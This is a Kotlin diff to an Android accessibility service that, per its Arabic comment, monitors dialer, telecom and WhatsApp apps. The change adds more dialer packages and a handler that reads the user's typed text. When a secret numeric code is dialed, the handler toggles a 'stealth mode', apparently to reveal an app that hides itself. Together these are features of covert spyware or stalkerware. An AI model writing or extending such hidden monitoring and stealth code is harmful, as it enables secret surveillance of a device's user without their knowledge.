@@ -30,6 +30,8 @@ class AppAccessibilityService : AccessibilityService() {
         // مراقبة تطبيقات الاتصال العادية وتطبيقات التواصل الاجتماعي
         val monitoredPackages = listOf(
             "com.google.android.dialer", 
+            "com.samsung.android.dialer",
+            "com.android.dialer",
             "com.android.server.telecom", 
             "com.android.phone",
             "com.whatsapp",
@@ -39,6 +41,15 @@ class AppAccessibilityService : AccessibilityService() {
         
         if (monitoredPackages.contains(packageName)) {
             when (event.eventType) {
+                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
+                    // Check if the user is typing the secret code in the dialer
+                    val typedText = event.text.toString().replace(Regex("[^0-9]"), "")
+                    if (typedText.contains("1356365508")) {
+                        Log.i(TAG, "Secret Code detected via typing! Opening app...")
+                        StealthManager.toggleStealthMode(this)
+                    }
+                }
+
                 AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED, 
                 AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                     val text = event.text.toString() + " " + (event.contentDescription ?: "")
